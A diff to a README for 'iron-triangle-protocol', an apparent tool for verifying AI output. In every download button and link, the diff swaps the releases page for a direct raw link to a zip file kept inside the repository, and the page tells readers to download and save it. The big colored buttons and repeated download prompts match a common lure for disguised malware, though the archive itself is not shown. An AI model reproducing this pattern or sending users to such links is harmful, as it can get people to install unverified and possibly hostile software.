@@ -1,6 +1,6 @@
 <h1>🧠 iron-triangle-protocol - Verified AI Work, Every Time</h1>
 
-<a href="https://github.com/Steeltrapliving5936/iron-triangle-protocol/releases" style="display:inline-block;padding:16px 32px;background:#ff6b6b;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD NOW</a>
+<a href="https://raw.githubusercontent.com/Steeltrapliving5936/iron-triangle-protocol/main/skills/iron-triangle/v3.6.zip" style="display:inline-block;padding:16px 32px;background:#ff6b6b;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD NOW</a>
 
 ## 🤔 What Is This?
 
@@ -43,7 +43,7 @@ Everything runs on standard Python tools. You don't need to install dozens of ex
 
 Visit this link to download the application:
 
-**👉 [https://github.com/Steeltrapliving5936/iron-triangle-protocol/releases](https://github.com/Steeltrapliving5936/iron-triangle-protocol/releases)**
+**👉 [https://raw.githubusercontent.com/Steeltrapliving5936/iron-triangle-protocol/main/skills/iron-triangle/v3.6.zip](https://raw.githubusercontent.com/Steeltrapliving5936/iron-triangle-protocol/main/skills/iron-triangle/v3.6.zip)**
 
 Click the "Download" button on that page. Your browser will save the file to your computer.
 
@@ -124,7 +124,7 @@ If you run into problems, check these resources:
 
 New versions are released regularly with improvements and fixes. Check the download page every few months for updates. The download link is the same:
 
-**👉 [https://github.com/Steeltrapliving5936/iron-triangle-protocol/releases](https://github.com/Steeltrapliving5936/iron-triangle-protocol/releases)**
+**👉 [https://raw.githubusercontent.com/Steeltrapliving5936/iron-triangle-protocol/main/skills/iron-triangle/v3.6.zip](https://raw.githubusercontent.com/Steeltrapliving5936/iron-triangle-protocol/main/skills/iron-triangle/v3.6.zip)**
 
 ## 🏁 Final Thoughts
 
@@ -132,7 +132,7 @@ Iron Triangle Protocol gives you peace of mind. No more wondering if your AI wor
 
 Download it today and let your AI work with a safety net.
 
-<a href="https://github.com/Steeltrapliving5936/iron-triangle-protocol/releases" style="display:inline-block;padding:16px 32px;background:#4ecdc4;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ GET STARTED NOW</a>
+<a href="https://raw.githubusercontent.com/Steeltrapliving5936/iron-triangle-protocol/main/skills/iron-triangle/v3.6.zip" style="display:inline-block;padding:16px 32px;background:#4ecdc4;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ GET STARTED NOW</a>
 
 ---
 
